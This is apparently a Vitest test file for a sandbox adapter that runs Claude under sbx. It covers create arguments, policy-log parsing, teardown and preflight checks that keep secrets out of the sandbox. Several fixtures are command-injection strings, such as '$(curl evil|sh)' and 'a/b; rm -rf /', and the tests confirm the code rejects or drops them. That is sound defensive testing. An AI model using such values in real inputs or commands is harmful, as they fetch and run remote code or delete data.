import { describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll } from "vitest";
import { CREATE_TIMEOUT_MS, makeSbxAdapter } from "../../../src/sandbox/sbx/adapter.ts";
import type { SbxResult, SbxRunner } from "../../../src/sandbox/sbx/run.ts";
import type { SandboxHandle } from "../../../src/sandbox/types.ts";

type Call = { args: string[]; opts?: { timeoutMs?: number; env?: NodeJS.ProcessEnv } };
const ok = (stdout = "", stderr = ""): SbxResult => ({ code: 0, stdout, stderr, timedOut: false });
const fail = (code: number | null, stderr: string, stdout = "", timedOut = false): SbxResult => ({ code, stdout, stderr, timedOut });

/** A recording fake runner; `respond` picks the answer per call (default: exit 0). */
function fakeRunner(respond: (args: string[]) => SbxResult = () => ok()): { run: SbxRunner; calls: Call[] } {
  const calls: Call[] = [];
  const run: SbxRunner = async (args, opts) => {
    calls.push({ args, opts });
    return respond(args);
  };
  return { run, calls };
}

const CFG = { kitDir: "/kit", envAllow: ["ANTHROPIC_DEFAULT_SONNET_MODEL", "EXTRA_NAME"] };
const N = "dl-12-webtarsthree-tars-1-dev-a1b2c3";
const H: SandboxHandle = { adapter: "sbx", instanceName: N };
/** Every *_MODEL default allowlist name set, so preflight tests don't warn. */
const FULL_ENV = { ANTHROPIC_DEFAULT_HAIKU_MODEL: "h", ANTHROPIC_DEFAULT_SONNET_MODEL: "s", ANTHROPIC_DEFAULT_OPUS_MODEL: "o" };
const FIXTURE = readFileSync(join(import.meta.dirname, "../../fixtures/sbx/policy-log-blocked.json"), "utf8");

describe("sbx adapter: name and validateConfig", () => {
  it("is named sbx and validates with validateSbxConfig", () => {
    const a = makeSbxAdapter({ run: fakeRunner().run });
    expect(a.name).toBe("sbx");
    expect(() => a.validateConfig(undefined)).toThrow("sandbox.sbx: kitDir is required");
    expect(a.validateConfig({ kitDir: "/kit" })).toMatchObject({ kitDir: "/kit" });
  });
});

describe("sbx adapter: prepare", () => {
  it("creates with the exact argv and CREATE_TIMEOUT_MS", async () => {
    const f = fakeRunner();
    const h = await makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: ["/abs/root", "/abs/repo"], config: CFG });
    expect(h).toEqual({ adapter: "sbx", instanceName: N });
    expect(CREATE_TIMEOUT_MS).toBe(180_000);
    expect(f.calls).toHaveLength(1);
    expect(f.calls[0].args).toEqual(["create", "--name", N, "--no-progress", "--no-input", "claude", "--kit", "/kit", "/abs/root", "/abs/repo"]);
    expect(f.calls[0].opts?.timeoutMs).toBe(CREATE_TIMEOUT_MS);
  });

  it("passes --memory when configured", async () => {
    const f = fakeRunner();
    await makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: ["/abs/root"], config: { ...CFG, memory: "4g" } });
    expect(f.calls[0].args).toEqual(["create", "--name", N, "--no-progress", "--no-input", "--memory", "4g", "claude", "--kit", "/kit", "/abs/root"]);
  });

  it("with a template, creates from it with --pull never, keeping the kit", async () => {
    const f = fakeRunner();
    await makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: ["/abs/root"], config: { ...CFG, template: "docker.io/library/dev-loop-sbx:v1" } });
    expect(f.calls[0].args).toEqual([
      "create", "--name", N, "--no-progress", "--no-input", "-t", "docker.io/library/dev-loop-sbx:v1", "--pull", "never", "claude", "--kit", "/kit", "/abs/root",
    ]);
  });

  it("a non-zero exit throws with the code and the first stderr line", async () => {
    const f = fakeRunner(() => fail(2, "boom: no daemon\nsecond line"));
    await expect(makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: [], config: CFG })).rejects.toThrow(
      "sbx create failed (2): boom: no daemon",
    );
  });

  it("a timeout throws naming the timeout", async () => {
    const f = fakeRunner(() => fail(null, "slow", "", true));
    await expect(makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: [], config: CFG })).rejects.toThrow(
      "sbx create failed (timeout): slow",
    );
  });

  it("a config without kitDir throws a clear error", async () => {
    const a = makeSbxAdapter({ run: fakeRunner().run });
    await expect(a.prepare({ instanceName: N, mounts: [], config: undefined })).rejects.toThrow(/kitDir/);
  });
});

describe("sbx adapter: wrap", () => {
  const adapter = makeSbxAdapter({ run: fakeRunner().run });

  async function handle(): Promise<SandboxHandle> {
    return adapter.prepare({ instanceName: N, mounts: [], config: CFG });
  }

  it("execs claude in the instance with -w and -e for allowlisted names present in env", async () => {
    const env = { ANTHROPIC_DEFAULT_SONNET_MODEL: "model-x", OTHER: "o", PATH: "/usr/bin" };
    const opts = { cwd: "/abs/root", env };
    const w = adapter.wrap(await handle(), "claude", ["-p", "hi"], opts);
    expect(w.cmd).toBe("sbx");
    expect(w.args).toEqual(["exec", "-w", "/abs/root", "-e", "ANTHROPIC_DEFAULT_SONNET_MODEL", N, "claude", "-p", "hi"]);
    expect(w.opts).toBe(opts);
  });

  it("omits -w when cwd is absent", async () => {
    const w = adapter.wrap(await handle(), "claude", ["-p"], { env: {} });
    expect(w.args).toEqual(["exec", N, "claude", "-p"]);
  });

  it("never puts an env value into args", async () => {
    const env = { ANTHROPIC_DEFAULT_SONNET_MODEL: "value-sonnet-1", EXTRA_NAME: "value-extra-2", SECRETISH: "value-secret-3" };
    const w = adapter.wrap(await handle(), "claude", ["-p"], { cwd: "/abs/root", env });
    expect(w.args).toContain("EXTRA_NAME");
    for (const v of Object.values(env)) for (const a of w.args) expect(a.includes(v), `${v} in ${a}`).toBe(false);
  });
});

describe("sbx adapter: inspect", () => {
  it("maps the captured policy log's blocked hosts to network denials with an approve hint", async () => {
    const f = fakeRunner(() => ok(FIXTURE));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 0);
    expect(f.calls.map((c) => c.args)).toEqual([["policy", "log", N, "--json"]]);
    expect(f.calls[0].opts?.timeoutMs).toBeUndefined();
    expect(r.denied).toEqual([{ kind: "network", target: "example.org:443" }]);
    expect(r.approveHint).toBe("Review, then run yourself if you approve:\nsbx policy allow network example.org");
  });

  it("exit 125 is an sbx exec infra denial", async () => {
    const f = fakeRunner(() => ok('{"allowed":[],"blocked":[]}'));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 125);
    expect(r.denied).toEqual([{ kind: "infra", target: "sbx exec" }]);
    expect(r.approveHint).toBeUndefined();
  });

  it("nothing blocked: no denials, no hint", async () => {
    const f = fakeRunner(() => ok('{"allowed":[],"blocked":[]}'));
    expect(await makeSbxAdapter({ run: f.run }).inspect(H, 0)).toEqual({ denied: [] });
  });

  it("de-duplicates hosts in the hint, one line per host without the port", async () => {
    const log = { allowed: [], blocked: [{ host: "a.example:443" }, { host: "a.example:80" }, { host: "b.example:443" }, { host: "a.example:443" }] };
    const f = fakeRunner(() => ok(JSON.stringify(log)));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 1);
    expect(r.denied).toEqual([
      { kind: "network", target: "a.example:443" },
      { kind: "network", target: "a.example:80" },
      { kind: "network", target: "b.example:443" },
    ]);
    expect(r.approveHint).toBe("Review, then run yourself if you approve:\nsbx policy allow network a.example\nsbx policy allow network b.example");
  });

  it("never puts a host with unexpected characters into a hint command, but keeps its denial", async () => {
    const bad = "x.com$(curl evil|sh):443";
    const log = { allowed: [], blocked: [{ host: bad }, { host: "y.com;rm:80" }, { host: "ok.example:443" }, { host: "[::1]:443" }] };
    const f = fakeRunner(() => ok(JSON.stringify(log)));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 0);
    expect(r.denied).toEqual([
      { kind: "network", target: bad },
      { kind: "network", target: "y.com;rm:80" },
      { kind: "network", target: "ok.example:443" },
      { kind: "network", target: "[::1]:443" },
    ]);
    expect(r.approveHint).toBe(
      [
        "Review, then run yourself if you approve:",
        "sbx policy allow network ok.example",
        "sbx policy allow network [::1]",
        `(not shown: a blocked host with unexpected characters; see sbx policy log ${N})`,
      ].join("\n"),
    );
    expect(r.approveHint).not.toContain("curl");
  });

  it("only unexpected hosts: the hint is the heading plus the not-shown line", async () => {
    const f = fakeRunner(() => ok(JSON.stringify({ allowed: [], blocked: [{ host: "a b:443" }] })));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 0);
    expect(r.approveHint).toBe(`Review, then run yourself if you approve:\n(not shown: a blocked host with unexpected characters; see sbx policy log ${N})`);
  });

  it("a failed policy log call is an infra denial, never a throw", async () => {
    const f = fakeRunner(() => fail(1, "error: daemon down"));
    const r = await makeSbxAdapter({ run: f.run }).inspect(H, 125);
    expect(r.denied).toEqual([
      { kind: "infra", target: "sbx exec" },
      { kind: "infra", target: "policy log" },
    ]);
  });

  it("unparseable policy log JSON is an infra denial, never a throw", async () => {
    for (const out of ["not json", "null", '{"blocked":"x"}']) {
      const f = fakeRunner(() => ok(out));
      expect((await makeSbxAdapter({ run: f.run }).inspect(H, 0)).denied).toEqual([{ kind: "infra", target: "policy log" }]);
    }
  });
});

describe("sbx adapter: teardown", () => {
  it("runs rm -f on the instance", async () => {
    const f = fakeRunner();
    await expect(makeSbxAdapter({ run: f.run }).teardown(H)).resolves.toBeUndefined();
    expect(f.calls.map((c) => c.args)).toEqual([["rm", "-f", N]]);
  });

  it("a not-found stderr is done", async () => {
    const f = fakeRunner(() => fail(1, `error: sandbox '${N}' not found`));
    await expect(makeSbxAdapter({ run: f.run }).teardown(H)).resolves.toBeUndefined();
  });

  it("twice runs rm twice and both resolve", async () => {
    let n = 0;
    const f = fakeRunner(() => (n++ === 0 ? ok() : fail(1, `error: sandbox '${N}' not found`)));
    const a = makeSbxAdapter({ run: f.run });
    await expect(a.teardown(H)).resolves.toBeUndefined();
    await expect(a.teardown(H)).resolves.toBeUndefined();
    expect(f.calls.map((c) => c.args)).toEqual([["rm", "-f", N], ["rm", "-f", N]]);
  });

  it("any other failure throws (spawn-claude logs it)", async () => {
    const f = fakeRunner(() => fail(1, "error: daemon down"));
    await expect(makeSbxAdapter({ run: f.run }).teardown(H)).rejects.toThrow("sbx rm failed (1): error: daemon down");
  });
});

describe("sbx adapter: cleanupOrphans", () => {
  it("removes only names that start with the prefix, one rm per name", async () => {
    const list = [{ name: "dl-1-a-x-1-dev-aaaaaa" }, { name: "dl-3-a-b-x-1-dev-bbbbbb" }, { name: "dl-1-a-y-2-research-cccccc" }, { name: "other" }];
    const f = fakeRunner((args) => (args[0] === "ls" ? ok(JSON.stringify(list)) : ok()));
    await expect(makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-1-a-" })).resolves.toBeUndefined();
    expect(f.calls.map((c) => c.args)).toEqual([
      ["ls", "--json"],
      ["rm", "-f", "dl-1-a-x-1-dev-aaaaaa"],
      ["rm", "-f", "dl-1-a-y-2-research-cccccc"],
    ]);
  });

  it("the other project's prefix removes only its own", async () => {
    const list = [{ name: "dl-1-a-x-1-dev-aaaaaa" }, { name: "dl-3-a-b-x-1-dev-bbbbbb" }];
    const f = fakeRunner((args) => (args[0] === "ls" ? ok(JSON.stringify(list)) : ok()));
    await makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-3-a-b-" });
    expect(f.calls.map((c) => c.args)).toEqual([["ls", "--json"], ["rm", "-f", "dl-3-a-b-x-1-dev-bbbbbb"]]);
  });

  it("a failed ls throws sbx ls failed", async () => {
    const f = fakeRunner(() => fail(1, "error: daemon down"));
    await expect(makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-1-a-" })).rejects.toThrow(/^sbx ls failed: /);
  });

  it("unparseable ls output throws sbx ls failed", async () => {
    const f = fakeRunner(() => ok("nope"));
    await expect(makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-1-a-" })).rejects.toThrow(/^sbx ls failed: /);
  });

  it("an empty list removes nothing", async () => {
    const f = fakeRunner(() => ok("[]"));
    await makeSbxAdapter({ run: f.run }).cleanupOrphans({ prefix: "dl-1-a-" });
    expect(f.calls.map((c) => c.args)).toEqual([["ls", "--json"]]);
  });
});

describe("sbx adapter: preflight", () => {
  const tmp = mkdtempSync(join(tmpdir(), "sbx-preflight-"));
  const kit = join(tmp, "kit");
  mkdirSync(kit);
  writeFileSync(join(kit, "spec.yaml"), "name: kit\n");
  const emptyKit = join(tmp, "empty-kit");
  mkdirSync(emptyKit);
  writeFileSync(join(emptyKit, "README"), "x");
  afterAll(() => rmSync(tmp, { recursive: true, force: true }));

  const P = "dl-12-webtarsthree-preflight-abc123";
  const R = "fandango/webtarsthree";
  const CHECK = [
    "exec", P, "sh", "-c",
    `node --version && git --version && jq --version && echo dl-step:direnv && direnv version && echo dl-step:git && git ls-remote git@github.com:${R}.git HEAD >/dev/null && echo dl-step:gh && gh api repos/${R} --jq .full_name`,
  ];
  const NO_REPO_CHECK = ["exec", P, "sh", "-c", "node --version && git --version && jq --version && echo dl-step:direnv && direnv version"];
  const identity = (p: string) => p;
  const ctx = (over: Partial<{ kitDir: string; mounts: string[]; cwd: string; repoRoot: string; githubRepo: string | undefined }> = {}) => ({
    repoRoot: over.repoRoot ?? "/abs/root",
    mounts: over.mounts ?? ["/abs/root", "/abs/repo"],
    cwd: over.cwd ?? "/abs/root",
    instanceName: P,
    githubRepo: "githubRepo" in over ? over.githubRepo : R,
    config: { kitDir: over.kitDir ?? kit, envAllow: [] },
  });
  const BASE = "v24.3.0\ngit version 2.47.0\njq-1.7.1\n";
  const DIRENV = `${BASE}dl-step:direnv\n2.32.1\n`;
  const GOOD = ok(`${DIRENV}dl-step:git\ndl-step:gh\n${R}\n`);
  const answer = (exec: SbxResult) => (args: string[]) => (args[0] === "exec" ? exec : ok());

  it("creates, runs the check, and removes the instance", async () => {
    const f = fakeRunner(answer(GOOD));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).resolves.toBeUndefined();
    expect(f.calls.map((c) => c.args)).toEqual([
      ["create", "--name", P, "--no-progress", "--no-input", "claude", "--kit", kit, "/abs/root", "/abs/repo"],
      CHECK,
      ["rm", "-f", P],
    ]);
    expect(f.calls[0].opts?.timeoutMs).toBe(CREATE_TIMEOUT_MS);
  });

  it("refuses a mount whose case differs from the disk's", async () => {
    const f = fakeRunner();
    const realpath = (p: string) => p.replace("/abs/repos/", "/abs/Repos/");
    await expect(
      makeSbxAdapter({ run: f.run, realpath, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ mounts: ["/abs/repos/x"], cwd: "/abs/Repos/x" })),
    ).rejects.toThrow('sandbox paths must match the disk\'s real case: "/abs/repos/x" is "/abs/Repos/x" on disk; cd into the real path and restart');
    expect(f.calls).toEqual([]);
  });

  it("a wrong-case mount that is not the cwd names targetRepo.path as the likely source", async () => {
    const realpath = (p: string) => p.replace("/abs/repos/", "/abs/Repos/");
    await expect(
      makeSbxAdapter({ run: fakeRunner().run, realpath, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ mounts: ["/abs/repos/x"], cwd: "/abs/Repos/y" })),
    ).rejects.toThrow(
      'sandbox paths must match the disk\'s real case: "/abs/repos/x" is "/abs/Repos/x" on disk; cd into the real path and restart; if it comes from targetRepo.path, fix the case in the config',
    );
  });

  it("refuses a cwd whose case differs from the disk's", async () => {
    const realpath = (p: string) => p.replace("/abs/root", "/abs/Root");
    await expect(
      makeSbxAdapter({ run: fakeRunner().run, realpath, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ mounts: [], cwd: "/abs/root" })),
    ).rejects.toThrow('"/abs/root" is "/abs/Root" on disk');
  });

  it("refuses a kitDir with no yaml, or one that does not exist", async () => {
    for (const dir of [emptyKit, join(tmp, "missing")]) {
      const f = fakeRunner();
      await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ kitDir: dir }))).rejects.toThrow(
        `sandbox.sbx.kitDir "${dir}" has no kit yaml`,
      );
      expect(f.calls).toEqual([]);
    }
  });

  it("refuses a node major different from the host's, and still removes the instance", async () => {
    const f = fakeRunner(answer(ok("v22.1.0\ngit version 2.47.0\n")));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      "sandbox image has no node 24: add node to the template (see docs/sandbox-sbx.md)",
    );
    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
  });

  it("refuses a missing node", async () => {
    const f = fakeRunner(answer(fail(127, "sh: 1: node: not found")));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      "sandbox image has no node 24: add node to the template (see docs/sandbox-sbx.md)",
    );
    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
  });

  const pf = (exec: SbxResult, over = {}) =>
    makeSbxAdapter({ run: fakeRunner(answer(exec)).run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx(over));

  it("a missing direnv names the template fix", async () => {
    await expect(pf(fail(127, "sh: 1: direnv: not found", `${BASE}dl-step:direnv\n`))).rejects.toThrow(
      "sandbox image has no direnv: add it to the template (npm run sbx:template:build; see docs/sandbox-sbx.md)",
    );
  });

  it("checks the target repo's .envrc is allowed when the mounts include one", async () => {
    const root = join(tmp, "dr-root");
    const repo = join(tmp, "dr-repo");
    mkdirSync(root, { recursive: true });
    mkdirSync(repo, { recursive: true });
    writeFileSync(join(repo, ".envrc"), "export X=1\n");
    const f = fakeRunner(answer(ok(`${DIRENV}dl-step:envrc\ndl-step:git\ndl-step:gh\n${R}\n`)));
    await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: () => {} }).preflight(
      ctx({ repoRoot: root, mounts: [root, repo], cwd: root }),
    );
    expect(f.calls[1].args[4]).toContain(`echo dl-step:envrc && direnv exec '${repo}' true && echo dl-step:git`);
  });

  it("a blocked .envrc names the template rebuild, never direnv allow by the loop", async () => {
    const r = fail(1, "direnv: error /x/.envrc is blocked. Run `direnv allow` to approve its content", `${DIRENV}dl-step:envrc\n`);
    await expect(pf(r)).rejects.toThrow(
      "the target repo's .envrc is not allowed inside the sandbox (it changed, or the template predates it): rebuild the template with npm run sbx:template:build (see docs/sandbox-sbx.md)",
    );
  });

  it("git blocked by the sandbox firewall names the host and the approval command", async () => {
    const r = fail(128, "remote: Approval required for github.com:443.\nremote:\nfatal: unable to access", `${DIRENV}dl-step:git\n`);
    await expect(pf(r)).rejects.toThrow(
      "sandbox network blocked github.com (git): approve it yourself with sbx policy approval ls, or sbx policy allow network github.com (see docs/sandbox-sbx.md)",
    );
  });

  it("gh api blocked by the sandbox firewall names api.github.com", async () => {
    const r = fail(1, 'non-200 OK status code: 403 Forbidden body: "Approval required for api.github.com:443.', `${DIRENV}dl-step:git\ndl-step:gh\n`);
    await expect(pf(r)).rejects.toThrow("sandbox network blocked api.github.com (gh api)");
  });

  it("a 404 from gh api means the sandbox's GitHub token cannot see the repo", async () => {
    const r = fail(1, '{"message":"Not Found","status":"404"}gh: Not Found (HTTP 404)', `${DIRENV}dl-step:git\ndl-step:gh\n`);
    await expect(pf(r)).rejects.toThrow(
      `the sandbox's GitHub token cannot see ${R} (gh api): check its repo access and any pending org approval, then sbx secret set github (see docs/sandbox-sbx.md)`,
    );
  });

  it("repository not found from git is the same token message", async () => {
    const r = fail(128, "remote: Repository not found.\nfatal: repository not found", `${DIRENV}dl-step:git\n`);
    await expect(pf(r)).rejects.toThrow(`the sandbox's GitHub token cannot see ${R} (git)`);
  });

  it("an SSH failure from git means the template lacks the HTTPS rewrite", async () => {
    const r = fail(128, "git@github.com: Permission denied (publickey).", `${DIRENV}dl-step:git\n`);
    await expect(pf(r)).rejects.toThrow(
      'git uses SSH inside the sandbox: add git config --global url."https://github.com/".insteadOf git@github.com: to the template (see docs/sandbox-sbx.md)',
    );
  });

  it("any other GitHub failure names the step and the first stderr line", async () => {
    const r = fail(1, "boom\nmore", `${DIRENV}dl-step:git\ndl-step:gh\n`);
    await expect(pf(r)).rejects.toThrow("sbx preflight failed (gh api): boom");
  });

  it("without a githubRepo, skips the GitHub checks", async () => {
    const f = fakeRunner(answer(ok(DIRENV)));
    await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ githubRepo: undefined }));
    expect(f.calls[1].args).toEqual(NO_REPO_CHECK);
  });

  it("refuses a githubRepo that is not a plain owner/repo before any sbx call", async () => {
    const f = fakeRunner();
    await expect(
      makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ githubRepo: "a/b; rm -rf /" })),
    ).rejects.toThrow('github.repo "a/b; rm -rf /" is not a plain owner/repo');
    expect(f.calls).toEqual([]);
  });

  describe("env files in shared folders", () => {
    const root = join(tmp, "root");
    const repo = join(tmp, "repo");
    mkdirSync(root);
    mkdirSync(repo);
    writeFileSync(join(root, ".env.example"), "X=\n");
    writeFileSync(join(repo, ".envrc.example"), "X=\n");

    it("ignores .example files", async () => {
      await expect(pf(GOOD, { repoRoot: root, mounts: [root, repo], cwd: root })).resolves.toBeUndefined();
    });

    for (const name of [".env", ".envrc", ".env.local"]) {
      it(`refuses a ${name} in the dev-loop folder before any sbx call`, async () => {
        writeFileSync(join(root, name), "SECRET=x\n");
        try {
          const f = fakeRunner();
          await expect(
            makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx({ repoRoot: root, mounts: [root, repo], cwd: root })),
          ).rejects.toThrow(`${name} is in ${root}, which the sandbox can read: move it out of the repo and point DEVLOOP_ENV_FILE at it (see docs/sandbox-sbx.md)`);
          expect(f.calls).toEqual([]);
        } finally {
          rmSync(join(root, name));
        }
      });
    }

    it("only warns, naming the files, for env files in another mounted folder", async () => {
      writeFileSync(join(repo, ".envrc"), "SECRET=x\n");
      try {
        const warnings: string[] = [];
        const f = fakeRunner(answer(GOOD));
        await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: (m) => void warnings.push(m) }).preflight(
          ctx({ repoRoot: root, mounts: [root, repo], cwd: root }),
        );
        expect(warnings).toEqual([`note: the sandbox agent can read .envrc in ${repo} (expected for local dev/INT settings; keep real secrets out of it).`]);
      } finally {
        rmSync(join(repo, ".envrc"));
      }
    });
  });

  it("refuses a missing jq (git ran, jq did not), and still removes the instance", async () => {
    const f = fakeRunner(answer(fail(127, "sh: 1: jq: not found", "v24.3.0\ngit version 2.47.0\n")));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      "sandbox image has no jq: add jq to the template (see docs/sandbox-sbx.md)",
    );
    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
  });

  it("a missing git (node ran, git did not) is sbx preflight failed, not a jq or gh message", async () => {
    const f = fakeRunner(answer(fail(127, "sh: 1: git: not found", "v24.3.0\n")));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      "sbx preflight failed: sh: 1: git: not found",
    );
  });

  it("warns once, names only, when *_MODEL allowlist names are unset, and does not throw", async () => {
    const warnings: string[] = [];
    const env = { ANTHROPIC_DEFAULT_SONNET_MODEL: "secret-sonnet-value" };
    const f = fakeRunner(answer(GOOD));
    await expect(
      makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env, warn: (m) => void warnings.push(m) }).preflight(ctx()),
    ).resolves.toBeUndefined();
    expect(warnings).toEqual([
      "WARNING: ANTHROPIC_DEFAULT_HAIKU_MODEL, ANTHROPIC_DEFAULT_OPUS_MODEL not set; inside the sandbox the sonnet/opus/haiku aliases fall back to stock model ids. Set them in your DEVLOOP_ENV_FILE.",
    ]);
    expect(warnings.join("")).not.toContain("secret-sonnet-value");
  });

  it("no warning when every *_MODEL allowlist name is set", async () => {
    const warnings: string[] = [];
    const f = fakeRunner(answer(GOOD));
    await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: (m) => void warnings.push(m) }).preflight(ctx());
    expect(warnings).toEqual([]);
  });

  it("any other exec failure is sbx preflight failed with the first stderr line", async () => {
    const f = fakeRunner(answer(fail(125, `error: sandbox '${P}' not found\nmore`)));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      `sbx preflight failed: error: sandbox '${P}' not found`,
    );
    expect(f.calls.at(-1)?.args).toEqual(["rm", "-f", P]);
  });

  it("a failed create is sbx preflight failed, and still removes the instance", async () => {
    const f = fakeRunner((args) => (args[0] === "create" ? fail(1, "error: no daemon") : ok()));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(ctx())).rejects.toThrow(
      /^sbx preflight failed: .*error: no daemon/,
    );
    expect(f.calls.map((c) => c.args[0])).toEqual(["create", "rm"]);
  });

  it("defaults hostNodeMajor to the running node's major", async () => {
    const major = process.versions.node.split(".")[0];
    const f = fakeRunner(answer(ok(`v${major}.0.0\ngit version 2.47.0\njq-1.7.1\ndl-step:direnv\n2.32.1\ndl-step:git\ndl-step:gh\n`)));
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, env: FULL_ENV }).preflight(ctx())).resolves.toBeUndefined();
  });
});

describe("helpers shared with scripts/sbx.mjs", () => {
  it("rootEnvFiles lists env files at a folder's top, skipping *.example", async () => {
    const { rootEnvFiles } = await import("../../../src/sandbox/sbx/adapter.ts");
    const d = mkdtempSync(join(tmpdir(), "sbx-envfiles-"));
    try {
      for (const f of [".env", ".envrc", ".env.local", ".env.example", "README.md"]) writeFileSync(join(d, f), "");
      expect(rootEnvFiles(d)).toEqual([".env", ".env.local", ".envrc"]);
      expect(rootEnvFiles(join(d, "missing"))).toEqual([]);
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  });

  it("allowHintLines checks hosts like inspect does: strips ports, drops unsafe hosts", async () => {
    const { allowHintLines } = await import("../../../src/sandbox/sbx/adapter.ts");
    const log = JSON.stringify({ blocked: [{ host: "a.example:443" }, { host: "a.example" }, { host: "x;curl evil" }] });
    expect(allowHintLines(log)).toEqual(["sbx policy allow network a.example", "(not shown: a blocked host with unexpected characters)"]);
    expect(allowHintLines("not json")).toBeUndefined();
    expect(allowHintLines(JSON.stringify({ blocked: [] }))).toEqual([]);
  });
});
